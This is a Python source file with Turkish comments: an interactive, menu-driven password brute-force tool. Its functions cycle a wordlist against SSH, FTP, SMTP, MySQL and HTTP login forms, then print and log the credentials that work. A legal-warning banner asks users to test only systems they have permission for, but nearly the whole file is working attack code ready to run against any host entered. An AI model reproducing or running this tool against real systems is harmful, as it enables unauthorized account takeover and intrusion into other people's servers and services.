#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# brutforce.py

import socket
import ftplib
import smtplib
import sys      # sys.exit için
import subprocess
import threading # Thread kullanmıyoruz ama import kalmış, kaldırılabilir veya eklenebilir.
import time     # Zamanlama için
from datetime import datetime
import traceback # Hata izi için
import shutil   # shutil.which için
import os       # os.path.exists için

# --- Gerekli Kütüphaneleri Kontrol Et ---
try:
    import paramiko # SSH için
except ImportError:
    print("Hata: 'paramiko' kütüphanesi bulunamadı.")
    print("Lütfen kurun: pip install paramiko")
    # SSH bruteforce çalışmayacak ama diğerleri çalışabilir.
    # sys.exit(1) # İstersen burada çıkılabilir.

try:
    import requests # HTTP Form için
except ImportError:
     print("Hata: 'requests' kütüphanesi bulunamadı.")
     print("Lütfen kurun: pip install requests")
     # HTTP Form bruteforce çalışmayacak.

# Renkli çıktılar
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    R = Fore.RED; Y = Fore.YELLOW; G = Fore.GREEN; C = Fore.CYAN; RESET = Style.RESET_ALL
    HEADER = Fore.MAGENTA; BLUE = Fore.BLUE; BOLD = Style.BRIGHT
except ImportError:
    R = Y = G = C = RESET = ""
    HEADER = BLUE = BOLD = ""

# --- YASAL UYARI ---
print(f"""{R}{BOLD}
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!          YASAL UYARI / WARNING          !!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Bruteforce saldırıları, İZNİNİZ OLMAYAN sistemlere
yönelik olarak yapıldığında YASA DIŞIDIR ve
çok ciddi sonuçları olabilir. Bu aracı yalnızca
etik kurallar çerçevesinde, sızma testleri veya
güvenlik araştırmaları için ve AÇIK İZNİNİZİN
olduğu sistemlerde kullanın.

Unauthorized bruteforce attacks against systems
you DO NOT HAVE EXPLICIT PERMISSION to test are
ILLEGAL and can have severe consequences. Use
this tool ethically and legally, only on systems
you have permission for penetration testing or
security research.

Tüm sorumluluk kullanıcıya aittir.
All responsibility lies with the user.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
{RESET}""")
time.sleep(3)


# Log sistemi
LOG_FILE = "bruteforce_logs.txt"
def log_kaydet(protokol, hedef, kullanici, sifre=None, durum="DENENDİ", hata_mesaji=None):
    """Bruteforce denemelerini loglar."""
    try:
        with open(LOG_FILE, "a", encoding='utf-8') as f:
            tarih = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
            log = f"[{tarih}] [{protokol.upper():<10}] Hedef: {hedef:<25} | Kullanıcı: {kullanici:<15}"
            if sifre:
                # Güvenlik için loglara şifreyi yazmamak daha iyi olabilir
                # log += f" | Şifre: {sifre:<20}"
                log += f" | Şifre: {'*'*len(sifre):<20}" # Veya sadece yıldız koy
            else:
                 log += f" | {'':<28}" # Boşluk hizalaması
            log += f" | Durum: {durum:<10}"
            if hata_mesaji:
                 log += f" | Hata: {hata_mesaji}"
            log += "\n"
            f.write(log)
    except Exception as e:
        print(f"{R}Log dosyasına yazılamadı ({LOG_FILE}): {e}{RESET}")

# --- Bruteforce Fonksiyonları (Hata Yönetimi İyileştirildi) ---

def ssh_bruteforce(host, port, username, wordlist, timeout=5):
    """SSH servisine bruteforce dener."""
    if 'paramiko' not in sys.modules:
        print(f"{R}Hata: 'paramiko' kütüphanesi yüklenemediği için SSH Bruteforce yapılamıyor.{RESET}")
        return False

    print(f"\n{C}🔓 SSH Bruteforce Başlatıldı ({host}:{port} - Kullanıcı: {username})...{RESET}")
    print(f"{Y}Wordlist: {wordlist}{RESET}")

    if not os.path.exists(wordlist):
         print(f"{R}Hata: Wordlist dosyası bulunamadı: {wordlist}{RESET}")
         return False

    ssh = None # Bağlantı nesnesini başlangıçta None yap
    found = False
    denenen_sayisi = 0
    baslangic_zamani = time.time()

    try:
        with open(wordlist, "r", errors="ignore", encoding='utf-8') as f: # encoding ekle
            for password in f:
                password = password.strip()
                if not password: continue # Boş satırları atla

                denenen_sayisi += 1
                # Her X denemede bir bilgi ver
                if denenen_sayisi % 50 == 0:
                     print(f"{C}Denendi: {denenen_sayisi}, Son denenen: {password}{RESET}", end='\r')

                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    # banner_timeout ve auth_timeout ekleyelim
                    ssh.connect(host, port=port, username=username, password=password,
                                timeout=timeout, banner_timeout=20, auth_timeout=20)
                    # Başarılı olursa
                    gecen_sure = time.time() - baslangic_zamani
                    print(f"\n{G}{BOLD}✅ BAŞARILI!{RESET}")
                    print(f"{G}   Kullanıcı: {username}{RESET}")
                    print(f"{G}   Şifre    : {password}{RESET}")
                    print(f"{G}   {denenen_sayisi} denemede bulundu ({gecen_sure:.2f} saniye).{RESET}")
                    log_kaydet("SSH", f"{host}:{port}", username, password, "BAŞARILI")
                    found = True
                    break # Şifre bulundu, döngüden çık

                except paramiko.AuthenticationException:
                    # Şifre yanlış - bu beklenen durum, logla ve devam et
                    log_kaydet("SSH", f"{host}:{port}", username, password, "BAŞARISIZ", "Kimlik Doğrulama Hatası")
                    continue # Sonraki şifreyi dene
                except paramiko.SSHException as e:
                    # Diğer SSH hataları (örn: banner alınamadı, soket kapandı vs.)
                    print(f"\n{R}SSH Hatası ({password}): {e}{RESET}")
                    log_kaydet("SSH", f"{host}:{port}", username, password, "HATA", str(e))
                    # Bu tür hatalarda devam etmek yerine durmak daha iyi olabilir
                    # break
                except socket.timeout:
                    print(f"\n{R}Zaman Aşımı ({password})! Hedef yanıt vermiyor veya '{timeout}' saniye çok kısa.{RESET}")
                    log_kaydet("SSH", f"{host}:{port}", username, password, "HATA", "Zaman Aşımı")
                    # Zaman aşımı sonrası devam etmeyebiliriz
                    # break
                except socket.error as e:
                     print(f"\n{R}Soket/Bağlantı Hatası ({password}): {e}{RESET}")
                     log_kaydet("SSH", f"{host}:{port}", username, password, "HATA", str(e))
                     break # Bağlantı hatasında genellikle durmak gerekir
                except Exception as e:
                     print(f"\n{R}Beklenmedik SSH Hatası ({password}): {e}{RESET}")
                     log_kaydet("SSH", f"{host}:{port}", username, password, "HATA", str(e))
                     traceback.print_exc()
                     # break # Beklenmedik hatada durmak iyi olabilir
                finally:
                    # Her denemeden sonra bağlantıyı kapat
                    if ssh:
                        ssh.close()
                        ssh = None

    except FileNotFoundError:
        # Bu hata yukarıda yakalandı ama yine de ekleyelim
        print(f"{R}Hata: Wordlist dosyası bulunamadı: {wordlist}{RESET}")
        return False
    except Exception as e:
        print(f"{R}Wordlist okunurken hata: {e}{RESET}")
        return False
    finally:
        # Döngü bittiğinde veya hata ile çıkıldığında son durumu yazdır
        print(" " * 80, end='\r') # Önceki deneme satırını temizle
        if found:
            print(f"{G}SSH Bruteforce tamamlandı. Şifre bulundu.{RESET}")
        else:
            gecen_sure = time.time() - baslangic_zamani
            print(f"{Y}SSH Bruteforce tamamlandı. {denenen_sayisi} şifre denendi ancak bulunamadı ({gecen_sure:.2f} saniye).{RESET}")

    return found


def ftp_bruteforce(host, port, username, wordlist, timeout=5):
    """FTP servisine bruteforce dener."""
    print(f"\n{C}📁 FTP Bruteforce Başlatıldı ({host}:{port} - Kullanıcı: {username})...{RESET}")
    print(f"{Y}Wordlist: {wordlist}{RESET}")

    if not os.path.exists(wordlist):
         print(f"{R}Hata: Wordlist dosyası bulunamadı: {wordlist}{RESET}")
         return False

    ftp = None
    found = False
    denenen_sayisi = 0
    baslangic_zamani = time.time()

    try:
        with open(wordlist, "r", errors="ignore", encoding='utf-8') as f:
            for password in f:
                password = password.strip()
                if not password: continue

                denenen_sayisi += 1
                if denenen_sayisi % 50 == 0:
                    print(f"{C}Denendi: {denenen_sayisi}, Son denenen: {password}{RESET}", end='\r')

                try:
                    ftp = ftplib.FTP(timeout=timeout)
                    # Bağlantıyı ayrı bir adımda yapalım
                    ftp.connect(host, port, timeout=timeout) # Bağlantı için de timeout
                    # Login olmayı dene
                    ftp.login(username, password)
                    # Başarılı olursa
                    gecen_sure = time.time() - baslangic_zamani
                    print(f"\n{G}{BOLD}✅ BAŞARILI!{RESET}")
                    print(f"{G}   Kullanıcı: {username}{RESET}")
                    print(f"{G}   Şifre    : {password}{RESET}")
                    print(f"{G}   {denenen_sayisi} denemede bulundu ({gecen_sure:.2f} saniye).{RESET}")
                    log_kaydet("FTP", f"{host}:{port}", username, password, "BAŞARILI")
                    found = True
                    # Başarılı bağlantıdan sonra çıkış yap
                    try: ftp.quit()
                    except: pass # Çıkışta hata olursa önemseme
                    break # Şifre bulundu

                except ftplib.error_perm as e:
                    # 530 Login incorrect gibi kalıcı hatalar
                    error_code = str(e).split(None, 1)[0] # Hata kodunu almayı dene
                    if error_code == '530': # Login hatası
                         log_kaydet("FTP", f"{host}:{port}", username, password, "BAŞARISIZ", "Kimlik Doğrulama Hatası (530)")
                    else: # Diğer izin hataları
                         print(f"\n{R}FTP İzin Hatası ({password}): {e}{RESET}")
                         log_kaydet("FTP", f"{host}:{port}", username, password, "HATA", str(e))
                    continue # Sonraki şifre
                except (socket.timeout, TimeoutError): # Hem socket hem ftplib timeout
                     print(f"\n{R}Zaman Aşımı ({password})! Hedef yanıt vermiyor veya '{timeout}' saniye çok kısa.{RESET}")
                     log_kaydet("FTP", f"{host}:{port}", username, password, "HATA", "Zaman Aşımı")
                     # Zaman aşımında devam etmek yerine durmak daha mantıklı olabilir
                     # break
                except (socket.error, ftplib.error_temp, EOFError) as e: # Bağlantı veya geçici hatalar
                     print(f"\n{R}FTP Bağlantı/Geçici Hata ({password}): {e}{RESET}")
                     log_kaydet("FTP", f"{host}:{port}", username, password, "HATA", str(e))
                     # Bu tür hatalarda genellikle durmak gerekir
                     break
                except Exception as e:
                     print(f"\n{R}Beklenmedik FTP Hatası ({password}): {e}{RESET}")
                     log_kaydet("FTP", f"{host}:{port}", username, password, "HATA", str(e))
                     traceback.print_exc()
                     # break
                finally:
                    # FTP nesnesi varsa kapatmayı dene
                    if ftp:
                        try: ftp.close() # quit yerine close kullanalım
                        except: pass
                        ftp = None

    except FileNotFoundError:
        print(f"{R}Hata: Wordlist dosyası bulunamadı: {wordlist}{RESET}")
        return False
    except Exception as e:
        print(f"{R}Wordlist okunurken hata: {e}{RESET}")
        return False
    finally:
        print(" " * 80, end='\r')
        if found:
            print(f"{G}FTP Bruteforce tamamlandı. Şifre bulundu.{RESET}")
        else:
            gecen_sure = time.time() - baslangic_zamani
            print(f"{Y}FTP Bruteforce tamamlandı. {denenen_sayisi} şifre denendi ancak bulunamadı ({gecen_sure:.2f} saniye).{RESET}")

    return found


def smtp_bruteforce(host, port, username, wordlist, timeout=5, use_ssl=False, use_tls=True):
    """SMTP servisine bruteforce dener (STARTTLS veya SSL ile)."""
    print(f"\n{C}📧 SMTP Bruteforce Başlatıldı ({host}:{port} - Kullanıcı: {username})...{RESET}")
    print(f"{C}   SSL: {'Aktif' if use_ssl else 'Pasif'}, STARTTLS: {'Aktif' if use_tls else 'Pasif'}{RESET}")
    print(f"{Y}Wordlist: {wordlist}{RESET}")

    if not os.path.exists(wordlist):
         print(f"{R}Hata: Wordlist dosyası bulunamadı: {wordlist}{RESET}")
         return False

    server = None
    found = False
    denenen_sayisi = 0
    baslangic_zamani = time.time()

    try:
        with open(wordlist, "r", errors="ignore", encoding='utf-8') as f:
            for password in f:
                password = password.strip()
                if not password: continue

                denenen_sayisi += 1
                if denenen_sayisi % 50 == 0:
                     print(f"{C}Denendi: {denenen_sayisi}, Son denenen: {password}{RESET}", end='\r')

                try:
                    # Bağlantı kur (SSL veya normal)
                    if use_ssl:
                        # print("Connecting with SMTP_SSL...") # Debug
                        server = smtplib.SMTP_SSL(host, port, timeout=timeout)
                    else:
                        # print("Connecting with SMTP...") # Debug
                        server = smtplib.SMTP(host, port, timeout=timeout)
                        # EHLO/HELO gönder (bazı sunucular için gerekli)
                        server.ehlo_or_helo_if_needed()
                        # STARTTLS kullan (eğer SSL değilse ve TLS aktifse)
                        if use_tls and server.has_extn('starttls'):
                             # print("Attempting STARTTLS...") # Debug
                             server.starttls()
                             server.ehlo_or_helo_if_needed() # TLS sonrası tekrar HELO gerekebilir
                        # else: print("STARTTLS not used or not supported.") # Debug

                    # Login olmayı dene
                    # print(f"Attempting login: {username} / {'*'*len(password)}") # Debug
                    server.login(username, password)
                    # Başarılı olursa
                    gecen_sure = time.time() - baslangic_zamani
                    print(f"\n{G}{BOLD}✅ BAŞARILI!{RESET}")
                    print(f"{G}   Kullanıcı: {username}{RESET}")
                    print(f"{G}   Şifre    : {password}{RESET}")
                    print(f"{G}   {denenen_sayisi} denemede bulundu ({gecen_sure:.2f} saniye).{RESET}")
                    log_kaydet("SMTP", f"{host}:{port}", username, password, "BAŞARILI")
                    found = True
                    try: server.quit() # Oturumu kapat
                    except: pass
                    break # Şifre bulundu

                except smtplib.SMTPAuthenticationError as e:
                    # print(f"Auth Error: {e.smtp_code} {e.smtp_error}") # Debug
                    # Kimlik doğrulama hatası (535 genellikle)
                    log_kaydet("SMTP", f"{host}:{port}", username, password, "BAŞARISIZ", f"Kimlik Doğrulama Hatası ({e.smtp_code})")
                    # Bağlantıyı kapatıp devam et
                    try: server.quit()
                    except: pass
                    server = None
                    continue # Sonraki şifre
                except smtplib.SMTPHeloError as e:
                     print(f"\n{R}SMTP HELO/EHLO Hatası: {e}{RESET}")
                     log_kaydet("SMTP", f"{host}:{port}", username, password, "HATA", f"HELO/EHLO Hatası")
                     break # Sunucu yanıt vermiyorsa devam etme
                except smtplib.SMTPNotSupportedError as e:
                     print(f"\n{R}SMTP Komut Desteklenmiyor Hatası (örn: STARTTLS): {e}{RESET}")
                     log_kaydet("SMTP", f"{host}:{port}", username, password, "HATA", f"Desteklenmeyen Komut")
                     # Eğer STARTTLS hatası ise, TLS olmadan tekrar denenebilir ama şimdilik duralım
                     break
                except smtplib.SMTPException as e:
                     # Diğer genel SMTP hataları
                     print(f"\n{R}Genel SMTP Hatası ({password}): {e}{RESET}")
                     log_kaydet("SMTP", f"{host}:{port}", username, password, "HATA", str(e))
                     # break
                except socket.timeout:
                     print(f"\n{R}Zaman Aşımı ({password})! SMTP sunucusu yanıt vermiyor veya '{timeout}' saniye çok kısa.{RESET}")
                     log_kaydet("SMTP", f"{host}:{port}", username, password, "HATA", "Zaman Aşımı")
                     # break
                except (socket.error, OSError) as e: # Bağlantı hataları
                     print(f"\n{R}SMTP Bağlantı Hatası ({password}): {e}{RESET}")
                     log_kaydet("SMTP", f"{host}:{port}", username, password, "HATA", str(e))
                     break # Bağlantı hatasında dur
                except Exception as e:
                    print(f"\n{R}Beklenmedik SMTP Hatası ({password}): {e}{RESET}")
                    log_kaydet("SMTP", f"{host}:{port}", username, password, "HATA", str(e))
                    traceback.print_exc()
                    # break
                finally:
                    # Her denemeden sonra sunucu bağlantısını kapatmayı dene
                    if server:
                        try: server.quit()
                        except: pass
                        server = None

    except FileNotFoundError:
        print(f"{R}Hata: Wordlist dosyası bulunamadı: {wordlist}{RESET}")
        return False
    except Exception as e:
        print(f"{R}Wordlist okunurken hata: {e}{RESET}")
        return False
    finally:
        print(" " * 80, end='\r')
        if found:
            print(f"{G}SMTP Bruteforce tamamlandı. Şifre bulundu.{RESET}")
        else:
            gecen_sure = time.time() - baslangic_zamani
            print(f"{Y}SMTP Bruteforce tamamlandı. {denenen_sayisi} şifre denendi ancak bulunamadı ({gecen_sure:.2f} saniye).{RESET}")

    return found


def mysql_bruteforce(host, port, username, wordlist, timeout=10): # Timeout artırıldı
    """MySQL servisine bruteforce dener (harici mysql client ile)."""
    print(f"\n{C}🗃️ MySQL Bruteforce Başlatıldı ({host}:{port} - Kullanıcı: {username})...{RESET}")
    print(f"{Y}Wordlist: {wordlist}{RESET}")

    # mysql komutunun varlığını kontrol et
    mysql_path = shutil.which("mysql")
    if not mysql_path:
        print(f"{R}Hata: 'mysql' istemcisi sistemde bulunamadı!{RESET}")
        print(f"{Y}Bu özellik için MySQL (veya MariaDB) komut satırı istemcisinin kurulu olması gerekir.{RESET}")
        print(f"{Y}Debian/Ubuntu: sudo apt install mysql-client (veya mariadb-client){RESET}")
        print(f"{Y}Termux: pkg install mariadb{RESET}")
        return False

    if not os.path.exists(wordlist):
         print(f"{R}Hata: Wordlist dosyası bulunamadı: {wordlist}{RESET}")
         return False

    found = False
    denenen_sayisi = 0
    baslangic_zamani = time.time()

    try:
        with open(wordlist, "r", errors="ignore", encoding='utf-8') as f:
            for password in f:
                password = password.strip()
                if not password: continue

                denenen_sayisi += 1
                if denenen_sayisi % 50 == 0:
                     print(f"{C}Denendi: {denenen_sayisi}, Son denenen: {password}{RESET}", end='\r')

                try:
                    # Komutu oluştururken şifreyi doğrudan vermek GÜVENLİ DEĞİL!
                    # Ancak mysql client bunu destekliyor (-p'den sonra boşluk yok).
                    # Daha güvenli yöntemler mysql_config_editor veya kütüphane kullanmaktır.
                    # Şimdilik komut satırı yöntemini kullanalım.
                    # -e 'QUIT' komutu sadece bağlantıyı test edip hemen çıkar.
                    # --connect-timeout seçeneğini ekleyelim.
                    cmd = [
                        mysql_path,
                        f"-h{host}",
                        f"-P{port}",
                        f"-u{username}",
                        f"-p{password}", # Şifre -p'ye bitişik
                        f"--connect-timeout={timeout}",
                        "-e", "QUIT"
                    ]
                    # stderr'i de yakalamak için PIPE kullan
                    result = subprocess.run(cmd, timeout=timeout + 5, capture_output=True, text=True, check=False, encoding='utf-8') # encoding ekle

                    # Dönüş kodunu kontrol et
                    if result.returncode == 0:
                        # Başarılı bağlantı
                        gecen_sure = time.time() - baslangic_zamani
                        print(f"\n{G}{BOLD}✅ BAŞARILI!{RESET}")
                        print(f"{G}   Kullanıcı: {username}{RESET}")
                        print(f"{G}   Şifre    : {password}{RESET}")
                        print(f"{G}   {denenen_sayisi} denemede bulundu ({gecen_sure:.2f} saniye).{RESET}")
                        log_kaydet("MySQL", f"{host}:{port}", username, password, "BAŞARILI")
                        found = True
                        break # Şifre bulundu
                    else:
                         # Başarısız - Hata mesajına bakabiliriz
                         error_output = result.stderr.strip()
                         log_kaydet("MySQL", f"{host}:{port}", username, password, "BAŞARISIZ", error_output)
                         # Access denied hatasını spesifik olarak kontrol edebiliriz
                         # if "Access denied" in error_output: continue
                         # Diğer hatalarda belki durmak gerekir
                         # else: print(f"\n{R}MySQL Hatası: {error_output}{RESET}"); break

                except subprocess.TimeoutExpired:
                    print(f"\n{R}Zaman Aşımı ({password})! MySQL komutu '{timeout+5}' saniyede tamamlanamadı.{RESET}")
                    log_kaydet("MySQL", f"{host}:{port}", username, password, "HATA", "Zaman Aşımı (subprocess)")
                    # break
                except Exception as e:
                     print(f"\n{R}Beklenmedik MySQL Hatası ({password}): {e}{RESET}")
                     log_kaydet("MySQL", f"{host}:{port}", username, password, "HATA", str(e))
                     traceback.print_exc()
                     # break

    except FileNotFoundError:
        print(f"{R}Hata: Wordlist dosyası bulunamadı: {wordlist}{RESET}")
        return False
    except Exception as e:
        print(f"{R}Wordlist okunurken hata: {e}{RESET}")
        return False
    finally:
        print(" " * 80, end='\r')
        if found:
            print(f"{G}MySQL Bruteforce tamamlandı. Şifre bulundu.{RESET}")
        else:
            gecen_sure = time.time() - baslangic_zamani
            print(f"{Y}MySQL Bruteforce tamamlandı. {denenen_sayisi} şifre denendi ancak bulunamadı ({gecen_sure:.2f} saniye).{RESET}")

    return found


def http_form_bruteforce(url, username, wordlist, username_field="username", password_field="password",
                          failure_text="login failed", # Başarısızlık belirtisi (küçük harf)
                          success_text=None, # Başarı belirtisi (opsiyonel, küçük harf)
                          timeout=10):
    """Basit HTTP login formlarına bruteforce dener."""
    if 'requests' not in sys.modules:
        print(f"{R}Hata: 'requests' kütüphanesi yüklenemediği için HTTP Form Bruteforce yapılamıyor.{RESET}")
        return False

    print(f"\n{C}🌐 HTTP Form Bruteforce Başlatıldı ({url})...{RESET}")
    print(f"{C}   Kullanıcı Adı Alanı: '{username_field}', Şifre Alanı: '{password_field}'{RESET}")
    print(f"{C}   Başarısızlık Metni (içerirse): '{failure_text}'{RESET}")
    if success_text: print(f"{C}   Başarı Metni (içerirse): '{success_text}'{RESET}")
    print(f"{Y}Wordlist: {wordlist}{RESET}")


    if not os.path.exists(wordlist):
         print(f"{R}Hata: Wordlist dosyası bulunamadı: {wordlist}{RESET}")
         return False

    found = False
    denenen_sayisi = 0
    baslangic_zamani = time.time()
    session = requests.Session() # Session kullanarak cookie'leri yönetebiliriz
    session.headers.update({'User-Agent': 'Mozilla/5.0'}) # Basit User-Agent

    try:
        with open(wordlist, "r", errors="ignore", encoding='utf-8') as f:
            for password in f:
                password = password.strip()
                if not password: continue

                denenen_sayisi += 1
                if denenen_sayisi % 50 == 0:
                    print(f"{C}Denendi: {denenen_sayisi}, Son denenen: {password}{RESET}", end='\r')

                try:
                    # Form verisini oluştur
                    data = {username_field: username, password_field: password}
                    # Ek form verileri gerekebilir (CSRF token vb.), bu basit deneme onları içermez.

                    # POST isteği gönder
                    response = session.post(url, data=data, timeout=timeout, allow_redirects=True) # Yönlendirmelere izin ver
                    response_text_lower = response.text.lower() # Küçük harfe çevirerek kontrol et

                    # Başarı/Başarısızlık kontrolü
                    login_failed = failure_text in response_text_lower
                    login_success = success_text and (success_text in response_text_lower)

                    if login_success: # Eğer başarı metni tanımlıysa ve bulunduysa
                         status = "BAŞARILI"
                         hata_mesaji = None
                         found = True
                    elif not login_failed: # Eğer başarısızlık metni YOKSA, başarılı kabul et
                         status = "BAŞARILI (Varsayım)"
                         hata_mesaji = None
                         found = True
                    else: # Başarısızlık metni bulunduysa
                         status = "BAŞARISIZ"
                         hata_mesaji = "Login Başarısız"

                    # Logla
                    log_kaydet("HTTP_FORM", url, username, password, status, hata_mesaji)

                    if found:
                        gecen_sure = time.time() - baslangic_zamani
                        print(f"\n{G}{BOLD}✅ {status}!{RESET}")
                        print(f"{G}   Kullanıcı: {username}{RESET}")
                        print(f"{G}   Şifre    : {password}{RESET}")
                        print(f"{G}   {denenen_sayisi} denemede bulundu ({gecen_sure:.2f} saniye).{RESET}")
                        # Başarılı olduğunda yanıtı incelemek isteyebiliriz
                        # print(f"{C}Başarılı Yanıt Kodu: {response.status_code}{RESET}")
                        # print(f"{C}Başarılı Yanıt URL'i: {response.url}{RESET}") # Yönlendirme olduysa farklı olabilir
                        break # Şifre bulundu

                except requests.exceptions.Timeout:
                    print(f"\n{R}Zaman Aşımı ({password})! Hedef URL yanıt vermiyor veya '{timeout}' saniye çok kısa.{RESET}")
                    log_kaydet("HTTP_FORM", url, username, password, "HATA", "Zaman Aşımı")
                    # break
                except requests.exceptions.RequestException as e:
                     print(f"\n{R}HTTP İstek Hatası ({password}): {e}{RESET}")
                     log_kaydet("HTTP_FORM", url, username, password, "HATA", str(e))
                     # break # Bağlantı hatasında durmak mantıklı olabilir
                except Exception as e:
                     print(f"\n{R}Beklenmedik HTTP Hatası ({password}): {e}{RESET}")
                     log_kaydet("HTTP_FORM", url, username, password, "HATA", str(e))
                     traceback.print_exc()
                     # break

    except FileNotFoundError:
        print(f"{R}Hata: Wordlist dosyası bulunamadı: {wordlist}{RESET}")
        return False
    except Exception as e:
        print(f"{R}Wordlist okunurken hata: {e}{RESET}")
        return False
    finally:
        print(" " * 80, end='\r')
        if found:
            print(f"{G}HTTP Form Bruteforce tamamlandı. Şifre bulundu.{RESET}")
        else:
            gecen_sure = time.time() - baslangic_zamani
            print(f"{Y}HTTP Form Bruteforce tamamlandı. {denenen_sayisi} şifre denendi ancak bulunamadı ({gecen_sure:.2f} saniye).{RESET}")

    return found


# Ana menü
def menu():
    """Ana menüyü gösterir."""
    print(f"""
    {HEADER}
    ╔══════════════════════════════════╗
    ║    {BOLD}GELİŞMİŞ BRUTEFORCE ARACI{RESET}{HEADER}    ║
    ╠══════════════════════════════════╣{BLUE}
    ║ 1. SSH Bruteforce                ║
    ║ 2. FTP Bruteforce                ║
    ║ 3. SMTP Bruteforce               ║
    ║ 4. MySQL Bruteforce              ║
    ║ 5. HTTP Form Bruteforce (Basit)  ║
    ║                                  ║{R}
    ║ 0. Çıkış                         ║{HEADER}
    ╚══════════════════════════════════╝{RESET}
    """)
    return input(f"{Y}Seçim (1-5/0): {RESET}").strip()

# Girişleri almak için yardımcı fonksiyon
def get_common_inputs(protocol_name):
     """Ortak girdileri (host, port, user, wordlist) alır."""
     print(f"\n{C}--- {protocol_name} Bruteforce Ayarları ---{RESET}")
     while True:
         host = input(f"Hedef IP/Hostname: ").strip()
         if host: break
         else: print(f"{R}Host boş olamaz!{RESET}")
     while True:
         try:
             port = int(input(f"Port: ").strip())
             if 1 <= port <= 65535: break
             else: print(f"{R}Port 1-65535 arasında olmalı!{RESET}")
         except ValueError: print(f"{R}Geçersiz port numarası!{RESET}")
     while True:
          username = input(f"Kullanıcı adı: ").strip()
          if username: break
          else: print(f"{R}Kullanıcı adı boş olamaz!{RESET}")
     while True:
          wordlist = input(f"Wordlist dosya yolu: ").strip()
          if not wordlist: print(f"{R}Wordlist yolu boş olamaz!{RESET}")
          elif not os.path.exists(wordlist): print(f"{R}Hata: Belirtilen wordlist dosyası bulunamadı!{RESET}")
          else: break
     return host, port, username, wordlist


def main():
    """Ana program akışı."""
    print(f"\n{Y}UYARI: Bu araç sadece yasal ve izinli testler için kullanılmalıdır!{RESET}")
    time.sleep(1)

    while True:
        try:
            secim = menu()

            if secim == "0":
                print(f"\n{G}Çıkış yapılıyor...{RESET}")
                break

            elif secim == "1": # SSH
                if 'paramiko' not in sys.modules:
                     print(f"{R}Hata: 'paramiko' kütüphanesi kurulu olmadığı için SSH seçeneği kullanılamıyor.{RESET}")
                     input(f"\n{C}Devam etmek için Enter...{RESET}")
                     continue
                host, port, username, wordlist = get_common_inputs("SSH")
                timeout_str = input(f"Timeout (saniye) [Varsayılan: 5]: ").strip() or "5"
                ssh_bruteforce(host, port, username, wordlist, int(timeout_str))

            elif secim == "2": # FTP
                host, port, username, wordlist = get_common_inputs("FTP")
                timeout_str = input(f"Timeout (saniye) [Varsayılan: 5]: ").strip() or "5"
                ftp_bruteforce(host, port, username, wordlist, int(timeout_str))

            elif secim == "3": # SMTP
                 host, port, username, wordlist = get_common_inputs("SMTP")
                 timeout_str = input(f"Timeout (saniye) [Varsayılan: 5]: ").strip() or "5"
                 # SSL/TLS seçeneklerini soralım
                 ssl_choice = input("SSL kullanılsın mı? (e/h) [Varsayılan: h]: ").strip().lower()
                 use_ssl = ssl_choice == 'e'
                 use_tls = False
                 if not use_ssl: # SSL değilse TLS soralım
                      tls_choice = input("STARTTLS kullanılsın mı? (e/h) [Varsayılan: e]: ").strip().lower()
                      use_tls = tls_choice != 'h' # h değilse true
                 smtp_bruteforce(host, port, username, wordlist, int(timeout_str), use_ssl, use_tls)

            elif secim == "4": # MySQL
                host, port, username, wordlist = get_common_inputs("MySQL")
                timeout_str = input(f"Timeout (saniye) [Varsayılan: 10]: ").strip() or "10"
                mysql_bruteforce(host, port, username, wordlist, int(timeout_str))

            elif secim == "5": # HTTP Form
                 if 'requests' not in sys.modules:
                      print(f"{R}Hata: 'requests' kütüphanesi kurulu olmadığı için HTTP Form seçeneği kullanılamıyor.{RESET}")
                      input(f"\n{C}Devam etmek için Enter...{RESET}")
                      continue
                 print(f"\n{C}--- HTTP Form Bruteforce Ayarları ---{RESET}")
                 url = input("Login Form URL: ").strip()
                 username = input("Kullanıcı adı: ").strip()
                 wordlist = input("Wordlist dosya yolu: ").strip()
                 # Opsiyonel alanlar
                 username_field = input("Formdaki Kullanıcı Adı Alanının Adı [Varsayılan: username]: ").strip() or "username"
                 password_field = input("Formdaki Şifre Alanının Adı [Varsayılan: password]: ").strip() or "password"
                 failure_text = input("Yanıt Metninde Başarısızlık Belirten Metin (küçük harf) [Varsayılan: login failed]: ").strip().lower() or "login failed"
                 success_text_in = input("Yanıt Metninde Başarı Belirten Metin (varsa, küçük harf): ").strip().lower()
                 success_text = success_text_in if success_text_in else None # Boşsa None yap
                 timeout_str = input(f"Timeout (saniye) [Varsayılan: 10]: ").strip() or "10"

                 if not all([url, username, wordlist]): # Gerekli alanlar boş mu?
                      print(f"{R}Hata: URL, kullanıcı adı ve wordlist boş olamaz!{RESET}")
                 elif not os.path.exists(wordlist):
                       print(f"{R}Hata: Belirtilen wordlist dosyası bulunamadı!{RESET}")
                 else:
                       http_form_bruteforce(url, username, wordlist, username_field, password_field,
                                           failure_text, success_text, int(timeout_str))
            else:
                print(f"\n{R}Geçersiz seçim!{RESET}")

            # Her işlemden sonra bekle
            input(f"\n{C}Devam etmek için Enter'a basın...{RESET}")

        except KeyboardInterrupt:
            print(f"\n{G}Çıkış yapılıyor...{RESET}")
            break
        except ValueError:
             print(f"{R}Hata: Lütfen sayısal alanlara (port, timeout) geçerli sayılar girin.{RESET}")
             input(f"\n{C}Devam etmek için Enter...{RESET}")
        except Exception as e:
            print(f"\n{R}Ana döngüde beklenmedik hata: {e}{RESET}")
            traceback.print_exc()
            input(f"\n{C}Devam etmek için Enter...{RESET}")


if __name__ == "__main__":
    main()